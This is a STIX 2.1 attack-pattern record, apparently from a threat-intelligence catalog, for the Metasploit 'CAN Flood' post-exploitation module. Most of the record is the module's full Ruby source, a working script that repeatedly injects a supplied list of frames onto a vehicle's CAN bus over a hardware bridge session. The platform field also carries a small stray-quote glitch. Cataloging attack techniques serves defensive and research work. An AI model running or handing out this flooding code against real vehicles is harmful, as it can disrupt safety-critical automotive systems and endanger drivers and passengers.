{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9efc7cef-5c3d-4504-bff2-9615ed3a07a1",
    "created": "2024-08-14T16:32:59.4471Z",
    "modified": "2024-08-14T16:32:59.447103Z",
    "name": "CAN Flood",
    "description": "This module floods a CAN interface with supplied frames.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/hardware/automotive/can_flood.rb",
            "external_id": "can_flood.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  DEFAULT_FRAMELIST = File.join(Msf::Config.data_directory, 'wordlists', 'can_flood_frames.txt')\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'CAN Flood',\n        'Description' => 'This module floods a CAN interface with supplied frames.',\n        'Author' => 'Pietro Biondi',\n        'License' => MSF_LICENSE,\n        'Platform' => 'hardware',\n        'SessionTypes' => ['hwbridge']\n      )\n    )\n\n    register_options([\n      OptString.new('CANBUS', [true, 'CAN interface']),\n      OptString.new('FRAMELIST', [true, 'Path to frame list file', DEFAULT_FRAMELIST]),\n      OptInt.new('ROUNDS', [true, 'Number of executed rounds', 200])\n    ])\n  end\n\n  def run\n    unless File.exist?(datastore['FRAMELIST'])\n      print_error(\"Frame list file '#{datastore['FRAMELIST']}' does not exist\")\n      return\n    end\n\n    vprint_status(\"Reading frame list file: #{datastore['FRAMELIST']}\")\n    frames = File.readlines(datastore['FRAMELIST']).map { |line| line.strip.split('+') }\n\n    print_status(' -- FLOODING -- ')\n    datastore['ROUNDS'].times do\n      frames.each { |frame| client.automotive.cansend(datastore['CANBUS'], frame[0], frame[1]) }\n    end\n  end\n\nend\n",
    "x_mitre_platforms": [
        "hardware'"
    ]
}